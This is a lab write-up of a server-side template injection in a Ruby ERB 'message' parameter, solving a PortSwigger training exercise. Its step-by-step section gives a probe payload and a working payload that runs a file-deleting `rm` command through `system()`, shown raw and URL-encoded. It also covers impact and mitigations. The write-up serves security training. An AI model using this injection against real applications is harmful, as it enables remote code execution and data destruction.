

# SSTI 1. Basic server side template Injection Message Parameter

## 2. CVSS Score

**CVSS v3.1 Base Score: 7.1 (High)**
**CWE-94: Improper Control of Generation of Code ('Code Injection')**

---

## 3. OWASP Top 10 Reference

* **A03:2021 – Injection**

---

## 4. Description of Vulnerability

The application improperly handles the `message` parameter by rendering it directly in an ERB (Embedded Ruby) template without sanitization. This allows an attacker to inject and execute arbitrary Ruby code on the server side. The vulnerability enables an attacker to run OS commands, potentially leading to unauthorized file deletion or remote code execution.

---

## 5. Detailed Explanation of What We Performed

* Observed that the `message` parameter value is rendered on the home page.
* Tested basic ERB expression injection by inserting `<%= 7*7 %>`.
* The rendered page showed `49`, confirming server-side template evaluation.
* From Ruby documentation, identified the `system()` method to execute OS commands.
* Constructed payload `<%= system("rm /home/carlos/morale.txt") %>` to delete Carlos’s file.
* URL-encoded the payload and inserted it into the `message` parameter.
* Loaded the URL to successfully delete the file and solve the lab.

---

## 6. Step-by-Step Procedure

### Step 1: Verify SSTI Vulnerability

1. Navigate to the product page and observe the GET request with the `message` parameter.
2. Insert the payload:

```
<%= 7*7 %>
```

3. URL-encode the payload:

```
%3C%25%3d+7*7+%25%3E
```

4. Use the URL format replacing `YOUR-LAB-ID`:

```
https://YOUR-LAB-ID.web-security-academy.net/?message=%3C%25%3d+7*7+%25%3E
```

5. Load the URL and observe the number `49` rendered instead of the message.

---

### Step 2: Exploit SSTI to Execute OS Command

6. From Ruby docs, use `system()` method to run OS commands.
7. Prepare payload to delete Carlos’s morale file:

```
<%= system("rm /home/carlos/morale.txt") %>
```

8. URL-encode the payload:

```
%3C%25+system("rm+/home/carlos/morale.txt")+%25%3E
```

9. Insert the payload in the URL:

```
https://YOUR-LAB-ID.web-security-academy.net/?message=%3C%25+system("rm+/home/carlos/morale.txt")+%25%3E
```

10. Load the URL to delete the file and solve the lab.

---

## 7. Impact of the Vulnerability

* Allows arbitrary code execution on the server.
* Leads to file deletion, data loss, and potential full server compromise.
* Can be leveraged to execute further commands, exfiltrate data, or pivot within the network.

---

## 8. Recommendations and Mitigations

* Avoid rendering user input directly in templates without sanitization or escaping.
* Use safe template rendering mechanisms that separate code from data.
* Apply strict input validation and escaping to user-controlled inputs.
* Implement least privilege for application processes to limit damage from code injection.
* Monitor and log suspicious template rendering activities.

---

## 9. References

* [Ruby ERB Documentation](https://ruby-doc.org/stdlib-2.6.3/libdoc/erb/rdoc/ERB.html)
* [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
* [PortSwigger Labs – Server-Side Template Injection](https://portswigger.net/web-security/template-injection)

